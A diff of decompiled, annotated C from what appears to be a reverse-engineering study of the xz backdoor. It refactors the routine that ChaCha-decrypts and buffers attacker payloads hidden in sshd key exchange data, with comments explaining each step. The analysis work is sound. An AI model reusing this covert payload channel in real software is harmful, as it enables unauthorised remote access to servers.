@@ -11,7 +11,6 @@
  * second time so the ChaCha keystream stays aligned with sshd's original consumer. Any failure (bad lengths, short
  * decrypts, exhausted buffer) forces `payload_state` back to PAYLOAD_STREAM_POISONED so future packets start from a clean slate.
  */
-
 #include "xzre_types.h"
 
 BOOL decrypt_payload_message(key_payload_t *payload,size_t payload_size,global_context_t *ctx)
@@ -54,27 +53,27 @@ BOOL decrypt_payload_message(key_payload_t *payload,size_t payload_size,global_c
     }
     if ((0x12 < payload_size) && ((uint)ctx->payload_state < 2)) {
       // AutoDoc: Stage the plaintext stride/index/bias header locally so ChaCha reuses the exact nonce sshd derived from the modulus chunk.
-      *(u64 *)&hdr.field0_0x0 = *(u64 *)&payload->field0_0x0;
-      hdr.field0_0x0.field1.cmd_type_bias = *(int64_t *)((long)&payload->field0_0x0 + 8);
+      hdr.cmd_type_stride = (payload->header).cmd_type_stride;
+      hdr.cmd_type_index = (payload->header).cmd_type_index;
+      hdr.cmd_type_bias = (payload->header).cmd_type_bias;
       // AutoDoc: Recover the ChaCha key/IV pair from the encrypted secret blob before touching the ciphertext.
       decrypt_success = secret_data_get_decrypted((u8 *)&payload_keystream_seed,ctx);
       if (decrypt_success != FALSE) {
         // AutoDoc: Point the decrypt cursor at the 2-byte length + ciphertext payload so the first ChaCha pass exposes the plaintext size in place.
-        ciphertext_cursor = &(payload->field0_0x0).field1.encrypted_body_length;
+        ciphertext_cursor = &payload->encrypted_body_length;
         inl = (int)payload_size + -0x10;
         // AutoDoc: First pass decrypts the header/trailer in place so the claimed body length can be validated.
         decrypt_success = chacha_decrypt((u8 *)ciphertext_cursor,inl,(u8 *)&payload_keystream_seed,(u8 *)&hdr,
                                (u8 *)ciphertext_cursor,ctx->imported_funcs);
         if (((decrypt_success != FALSE) &&
-            (plaintext_body_len = (ulong)(payload->field0_0x0).field1.encrypted_body_length,
             // AutoDoc: Reject lengths that claim more plaintext than the ciphertext can hold once the 16-byte header and 2-byte size prefix are removed.
-            plaintext_body_len <= payload_size - 0x12)) &&
+            (plaintext_body_len = (ulong)payload->encrypted_body_length, plaintext_body_len <= payload_size - 0x12)) &&
            // AutoDoc: Make sure the staging buffer still has capacity before appending another decrypted chunk.
            (buffered_payload_bytes = ctx->payload_bytes_buffered, plaintext_body_len < ctx->payload_buffer_size - buffered_payload_bytes)) {
           payload_buffer_cursor = ctx->payload_buffer;
           // AutoDoc: Copy the plaintext body directly into `ctx->payload_buffer`, preserving the stream order.
           for (body_copy_idx = 0; plaintext_body_len != body_copy_idx; body_copy_idx = body_copy_idx + 1) {
-            payload_buffer_cursor[body_copy_idx + buffered_payload_bytes] = *(u8 *)((long)&payload->field0_0x0 + body_copy_idx + 0x12);
+            payload_buffer_cursor[body_copy_idx + buffered_payload_bytes] = payload->encrypted_body[body_copy_idx];
           }
           ctx->payload_bytes_buffered = ctx->payload_bytes_buffered + plaintext_body_len;
           // AutoDoc: Re-run the decrypt so ChaCha’s keystream pointer stays aligned with sshd’s original consumer.
